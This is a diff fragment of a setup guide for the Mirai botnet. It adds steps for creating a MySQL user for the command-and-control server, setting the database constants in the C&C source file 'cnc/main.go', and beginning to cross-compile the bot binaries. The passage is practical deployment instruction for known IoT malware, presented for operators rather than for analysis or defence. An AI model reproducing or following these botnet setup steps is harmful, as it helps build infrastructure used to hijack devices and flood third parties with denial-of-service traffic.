@@ -31,6 +31,18 @@ Add users to mysql.
 > INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
 > exit
 # vi ../mirai/cnc/main.go
+```
+line 10 - line 14 set mysql user and pass here
+```
+const DatabaseAddr string   = "127.0.0.1"
+const DatabaseUser string   = "root"
+const DatabasePass string   = "root"
+const DatabaseTable string  = "mirai"
+```
+Cross Compile
+
+Next, go to the scripts directory.
+```
 # cd .. && mkdir cross-compile-bin
 # cd cross-compile-bin
 
